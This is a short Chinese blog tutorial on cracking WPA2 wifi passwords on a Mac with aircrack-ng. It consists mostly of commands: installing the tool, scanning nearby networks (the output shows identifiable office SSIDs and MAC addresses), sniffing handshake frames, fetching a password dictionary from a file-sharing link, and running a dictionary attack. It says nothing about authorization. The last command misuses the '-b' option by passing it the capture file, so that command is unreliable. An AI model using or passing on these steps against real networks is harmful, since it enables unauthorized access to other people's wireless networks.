---
layout: topic
module: Mac
title:  Mac下破解wifi密码
date:   2017-02-28
---

#### 安装Aircrack-ng

Homebrew安装方式:

```shell
$ brew link makedepend
$ brew install aircrack-ng
```

#### 链接airport

```bash
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/sbin/airport
```

```bash
$ airport -s

        SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
    DP-Guest c4:14:3c:cb:87:14 -64  1       Y  CN WPA2(PSK/AES/AES) 
        MTDP 1c:1d:86:71:be:fd -69  165     Y  CN WPA2(802.1x,Unrecognized(0)/AES/AES) 
          DP c4:14:3c:cb:87:10 -66  1       Y  CN WPA2(802.1x,Unrecognized(0)/AES/AES) 
    DP-Guest 1c:1d:86:07:c4:44 -57  1       Y  CN WPA2(PSK/AES/AES) 
  MTDP_guest c4:14:3c:cb:87:16 -55  1       Y  CN NONE
         MBP 98:01:a7:9f:6c:f7 -62  1       Y  -- WPA2(PSK/AES/AES) 
        MTDP 1c:1d:86:07:c4:42 -54  1       Y  CN WPA2(802.1x,Unrecognized(0)/AES/AES) 
     DP_tech c4:14:3c:cb:87:11 -64  1       Y  CN WPA2(802.1x,Unrecognized(0)/AES/AES)
```

#### 监听抓包

```bash
$ airport en0 sniff 6
Capturing 802.11 frames on en0.

Session saved to /tmp/airportSniffUpXJbV.cap.
```

#### 下载密码字典

下载地址: [https://pan.baidu.com/s/1o7MCcHk](https://pan.baidu.com/s/1o7MCcHk)

#### 破解wifi密码

```bash
sudo aircrack-ng -w password.txt -b /tmp/airportSniffUpXJbV.cap
```

#### 参考资料

1. [http://topspeedsnail.com/macbook-crack-wifi-with-wpa-wpa2/](http://topspeedsnail.com/macbook-crack-wifi-with-wpa-wpa2/)
